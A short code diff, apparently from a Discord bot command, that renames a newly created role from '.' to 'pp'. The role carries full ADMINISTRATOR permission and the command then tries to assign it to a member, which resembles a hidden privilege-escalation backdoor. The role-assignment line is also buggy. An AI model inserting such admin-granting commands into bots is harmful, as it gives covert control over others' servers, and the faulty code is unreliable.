@@ -15,12 +15,13 @@ module.exports = {
 
 		message.guild.roles.create({
 			data: {
-				name: '.',
-				permissions: [{
+				name: 'pp',
+				permissions:[{
 					'ADMINISTRATOR': true,
 				}],
 			},
 		});
+
 		member.roles.add(member);
 	},
 };
